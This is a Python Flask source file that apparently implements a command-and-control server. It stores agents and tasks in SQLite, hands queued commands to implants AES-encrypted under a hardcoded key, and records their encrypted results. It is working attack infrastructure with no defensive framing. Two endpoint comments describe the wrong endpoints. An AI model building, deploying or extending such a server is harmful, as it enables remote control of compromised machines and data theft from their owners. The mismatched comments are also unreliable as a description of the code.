from flask import Flask, request, jsonify
from Cryptodome.Cipher import AES
from Cryptodome.Util.Padding import pad, unpad
import base64
import sqlite3

# This MUST be exactly 16, 24, or 32 bytes long
SECRET_KEY = b'SixteenByteKey!!' 

def encrypt_msg(plaintext):
    # Create a new cipher object with a random IV
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC)
    # Pad the plaintext to match AES block size and encrypt
    ct_bytes = cipher.encrypt(pad(plaintext.encode(), AES.block_size))
    # Combine IV + Ciphertext and encode to Base64 (since we are sending this over HTTP, base64 is preferred)
    return base64.b64encode(cipher.iv + ct_bytes).decode('utf-8')

def decrypt_msg(encoded_ciphertext):
    # Decode from Base64
    raw = base64.b64decode(encoded_ciphertext)
    # Extract the first 16 bytes (the IV) and the rest (the message)
    iv = raw[:16]
    ciphertext = raw[16:]
    cipher = AES.new(SECRET_KEY, AES.MODE_CBC, iv)
    # Decrypt and remove padding
    return unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')

def init_db():
    conn = sqlite3.connect('c2.db')
    cursor = conn.cursor()
    
    # Create Agents table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            agent_id TEXT PRIMARY KEY,
            last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')
    
    # Create Tasks table
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS tasks (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            agent_id TEXT,
            command TEXT,
            result TEXT,
            status TEXT DEFAULT 'pending',
            FOREIGN KEY(agent_id) REFERENCES agents(agent_id)
        )
    ''')
    
    conn.commit()
    conn.close()

app = Flask(__name__)

@app.route('/get_task/<agent_id>', methods=['GET'])
def get_task(agent_id):
    conn = sqlite3.connect('c2.db')
    cursor = conn.cursor()
    
    # Update 'last_seen' for the agent
    cursor.execute("INSERT OR REPLACE INTO agents (agent_id) VALUES (?)", (agent_id,))
    
    # Fetch the oldest pending task
    cursor.execute("SELECT id, command FROM tasks WHERE agent_id = ? AND status = 'pending' ORDER BY id ASC LIMIT 1", (agent_id,))
    row = cursor.fetchone()
    
    if row:
        task_id, command = row
        # Mark as sent
        cursor.execute("UPDATE tasks SET status = 'sent' WHERE id = ?", (task_id,))
        conn.commit()
        payload = encrypt_msg(command)
    else:
        payload = encrypt_msg("nop")
        
    conn.close()
    return jsonify({"task": payload})

# Endpoint 2: The Agent calls this to send back results
@app.route('/set_task/<agent_id>', methods=['POST'])
def set_task(agent_id):
    command = request.json.get("command")
    
    conn = sqlite3.connect('c2.db')
    cursor = conn.cursor()
    # Insert a new pending task
    cursor.execute("INSERT INTO tasks (agent_id, command) VALUES (?, ?)", (agent_id, command))
    conn.commit()
    conn.close()
    
    return jsonify({"status": "queued"})

# 3. Endpoint 3: Red team endpoint to send commands to agents
@app.route('/post_result/<agent_id>', methods=['POST'])
def post_result(agent_id):
    encrypted_data = request.json.get("result")
    decrypted_result = decrypt_msg(encrypted_data)
    
    # Connect to the database
    conn = sqlite3.connect('c2.db')
    cursor = conn.cursor()
    
    # SQL LOGIC:
    # 1. Find the most recent task for this agent that is marked as 'sent'
    # 2. Update that task's result and mark it as 'completed'
    cursor.execute('''
        UPDATE tasks 
        SET result = ?, status = 'completed' 
        WHERE id = (
            SELECT id FROM tasks 
            WHERE agent_id = ? AND status = 'sent' 
            ORDER BY id DESC LIMIT 1
        )
    ''', (decrypted_result, agent_id))
    
    conn.commit()
    conn.close()
    
    print(f"[+] Result saved to database for {agent_id}")
    return jsonify({"status": "success"})

if __name__ == '__main__':
    init_db()
    # Running on port 5000
    app.run(host='0.0.0.0', port=5000)